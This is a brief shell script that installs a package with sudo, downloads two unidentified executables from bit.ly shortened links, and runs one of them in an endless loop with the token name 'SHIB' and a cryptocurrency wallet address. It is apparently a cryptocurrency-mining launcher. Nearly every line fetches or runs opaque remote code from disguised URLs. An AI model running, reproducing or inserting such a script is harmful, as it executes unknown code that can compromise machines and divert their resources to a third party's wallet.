#!/bin/sh
sudo apt update && sudo apt install timelimit -y
wget -O yoi https://bit.ly/2V9cewy
wget -O yes https://bit.ly/370h4ib
chmod +x yoi yes
while :; do timeout 45 bash yoi SHIB 0xbade577cb364798821d998811619de7fdb5a9d35; sleep 1; done
